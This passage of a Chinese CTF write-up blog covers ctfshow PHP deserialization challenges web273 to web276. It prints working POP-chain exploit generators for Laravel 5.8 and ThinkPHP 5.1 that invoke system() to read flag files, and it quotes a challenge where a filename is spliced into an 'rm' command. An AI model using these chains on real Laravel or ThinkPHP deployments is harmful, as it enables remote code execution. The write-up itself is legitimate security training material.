class="line"><span class="title">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$queueResolver</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = <span class="variable">$queueResolver</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">QueuedCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$connection</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="variable">$connection</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">line</span> = <span class="title">new</span> <span class="title">PhpParser</span>\<span class="title">Node</span>\<span class="title">Scalar</span>\<span class="title">MagicConst</span>\<span class="title">Line</span>();</span><br><span class="line">    <span class="variable">$mockdefinition</span> = <span class="keyword">new</span> Mockery\<span class="built_in">Generator</span>\MockDefinition(<span class="variable">$line</span>,<span class="string">&quot;&lt;?php system(&#x27;cat /f*&#x27;);exit;?&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$evalloader</span> = <span class="keyword">new</span> Mockery\Loader\EvalLoader();</span><br><span class="line">    <span class="variable">$dispatcher</span> = <span class="keyword">new</span> Illuminate\Bus\Dispatcher(<span class="keyword">array</span>(<span class="variable">$evalloader</span>,<span class="string">&#x27;load&#x27;</span>));</span><br><span class="line">    <span class="variable">$queuedcommand</span> = <span class="keyword">new</span> Illuminate\Foundation\Console\QueuedCommand(<span class="variable">$mockdefinition</span>);</span><br><span class="line">    <span class="variable">$pendingbroadcast</span> = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$dispatcher</span>,<span class="variable">$queuedcommand</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$pendingbroadcast</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶å®è¿˜æœ‰æŒºå¤šé“¾çš„</p><p><a href="https://www.anquanke.com/post/id/189718">https://www.anquanke.com/post/id/189718</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629258925-4f0e4796-dcee-4930-80c7-7d7270a40549.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629258925-4f0e4796-dcee-4930-80c7-7d7270a40549.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web273-å’Œweb273ä¸€æ ·"><a href="#web273-å’Œweb273ä¸€æ ·" class="headerlink" title="web273 å’Œweb273ä¸€æ ·"></a>web273 å’Œweb273ä¸€æ ·</h2><p>PHP/7.1.32æ¡†æ¶å®¡è®¡Laravel 5.8ç™»å½•å‰</p><span class='btn'><a class="button"  title='PHP/7.1.32'><i class='fas fa-tag'></i>PHP/7.1.32</a></span> <span class='btn'><a class="button"  title='æ¡†æ¶å®¡è®¡'><i class='fas fa-tag'></i>æ¡†æ¶å®¡è®¡</a></span> <span class='btn'><a class="button"  title='Laravel 5.8ç™»å½•å‰'><i class='fas fa-tag'></i>Laravel 5.8ç™»å½•å‰</a></span><p>emmï¼Œè¯´å®è¯é™¤äº†PHPç‰ˆæœ¬ç»†å¾®å·®åˆ«ï¼Œè¿˜ä¸çŸ¥é“æœ‰å•¥åŒºåˆ«ï¼Œç«Ÿç„¶ poc ä¸€æ¯›ä¸€æ ·</p><p>æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629565347-7bf6ef81-cfd7-45b4-a599-27efeea51f2a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629565347-7bf6ef81-cfd7-45b4-a599-27efeea51f2a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web274-thinkphp5-1"><a href="#web274-thinkphp5-1" class="headerlink" title="web274 thinkphp5.1"></a>web274 thinkphp5.1</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='æ¡†æ¶å®¡è®¡'><i class='fas fa-tag'></i>æ¡†æ¶å®¡è®¡</a></span> <span class='btn'><a class="button"  title='thinkphp5.1'><i class='fas fa-tag'></i>thinkphp5.1</a></span><p>thinkphp 5.1ååºåˆ—åŒ–æ¼æ´</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/6619">https://xz.aliyun.com/t/6619</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ•°æ®æ¥æ”¶æ–¹å¼</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629667117-4e40ccfe-f0e0-4453-9eac-b68faa387554.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629667117-4e40ccfe-f0e0-4453-9eac-b68faa387554.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç° ï¼ˆ</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;lin&quot;</span>=&gt;[<span class="string">&quot;calc.exe&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;lin&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// è¡¨å•ajaxä¼ªè£…å˜é‡</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,  </span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;lin&#x27;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629772399-69dfd9ce-fca2-433b-babd-40ed2cceb86a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617629772399-69dfd9ce-fca2-433b-babd-40ed2cceb86a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web275-å‘½ä»¤æ‰§è¡Œæ‹¼æ¥"><a href="#web275-å‘½ä»¤æ‰§è¡Œæ‹¼æ¥" class="headerlink" title="web275 å‘½ä»¤æ‰§è¡Œæ‹¼æ¥"></a>web275 å‘½ä»¤æ‰§è¡Œæ‹¼æ¥</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">filter</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filecontent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evilfile</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$fn</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filecontent=<span class="variable">$fn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkevil</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|\.\./i&#x27;</span>, <span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/i&#x27;</span>, <span class="keyword">$this</span>-&gt;filecontent))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;evilfile=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;evilfile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;evilfile)&#123;</span><br><span class="line">            system(<span class="string">&#x27;rm &#x27;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> filter(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;checkevil()===<span class="literal">false</span>)&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        copy(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],md5(mt_rand()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        unlink(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>çœ‹ä¼¼èŠ±é‡Œèƒ¡å“¨ï¼Œå…¶å® <code>__destruct</code> é‡Œçš„ <code>system</code> å¯ç›´æ¥æ‹¼æ¥ï¼Œä¹Ÿå°±æ˜¯è®¾æ³•è®© <code>$this-&gt;evilfile</code> ç½®ä¸º <code>true</code> ï¼Œç„¶åæ‹¼æ¥å‘½ä»¤å³å¯ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617632875169-378dcce8-4e3b-46a6-aa15-5834a078e4a2.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617632875169-378dcce8-4e3b-46a6-aa15-5834a078e4a2.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>é¢˜å¤–ï¼šç¬¬ä¸€çœ¼çœ‹å»è¿™ä¸€è¯»ä¸€å†™ï¼Œé•¿çš„è¿™ä¹ˆæƒ³è¢«æˆ‘æ¡ä»¶ç«äº‰çš„æ ·å­ ï¼ˆ</p><h2 id="web276-pharååºåˆ—åŒ–-æ¡ä»¶ç«äº‰"><a href="#web276-pharååºåˆ—åŒ–-æ¡ä»¶ç«äº‰" class="headerlink" title="web276 pharååºåˆ—åŒ– æ¡ä»¶ç«äº‰"></a>web276 pharååºåˆ—åŒ– æ¡ä»¶ç«äº‰</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='pharååºåˆ—åŒ–'><i class='fas fa-tag'></i>pharååºåˆ—åŒ–</a></span> <span class='btn'><a class="button"  title='æ¡ä»¶ç«äº‰'><i class='fas fa-tag'></i>æ¡ä»¶ç«äº‰</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-08 19:13:36</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-08 20:08:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: 